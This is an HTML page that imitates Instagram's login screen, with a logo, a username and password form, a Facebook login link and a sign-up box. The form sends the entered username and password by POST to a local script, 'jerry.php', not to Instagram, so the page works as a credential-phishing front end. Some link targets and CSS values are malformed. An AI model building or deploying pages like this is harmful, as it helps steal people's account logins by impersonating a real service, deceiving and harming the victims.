<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #fafafa;
            margin: 1px;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 70vh; /* Full height of the viewport */
            flex-direction: column; /* Ensures that the containers stack vertically */
        }
        .login-container {
            background-color: white;
            box-shadow: 0px 15px 10px rgba(0, 0, 0, 0.1);
            width: 270px;
            padding: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 10px; /* Adds space between the containers */
        }
        .logo {
            width: 400px;
            margin-bottom: 30px;
        }
        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
        }
        .btn-login {
            background-color: #0095f6;
            color: white;
            padding: 10px;
            border-radius: 10px;
            width: 100%;
            font-size: 14px;
            cursor: pointer;
            border: none;
            margin-top: 10px;
        }
        .btn-login:hover {
            background-color: #007bb5;
        }
        .forgot-password {
            text-align: center;
            margin-top: 5px;
        }
        .forgot-password a {
            font-size: 14px;
            color: #000000;
            text-decoration: none;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            width: 100%;
        }
        .divider-line {
            height: 1px;
            background-color: #dbdbdb;
            flex-grow: 1;
        }
        .divider-text {
            font-size: 12px;
            margin: 0 10px;
            color: #8e8e8e;
        }
        .Link {
            text-align: center;
            font-size: 14px;
        }
        .Link a {
            color: #0095f6;
            text-decoration: solid;
        }
        .signup {
            background-color: white;
            box-shadow: 0px 1px 15px rgba(0, 0, 0, 0.1);
            width: 270px;
            padding: 30px;
            display: default;
            flex-direction: center;
            align-items: center;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="1.webp" alt="Instagram Logo" class="logo">
        <form action="jerry.php" method="POST">
            <input type="text" class="input-field" id="Username" name="username" placeholder="Phone number, username or email" required>
            <input type="password" class="input-field" id="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        
        <div class="divider">
            <div class="divider-line"></div>
            <span class="divider-text">OR</span>
            <div class="divider-line"></div>
        </div>
        <div class="Link">
            <a href="da awl rih">Login with Facebook</a>
        </div>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
    </div>

    <div class="signup">
        Don't have an account? <a href="#">Sign up</a>
    </div>

</body>
</html>
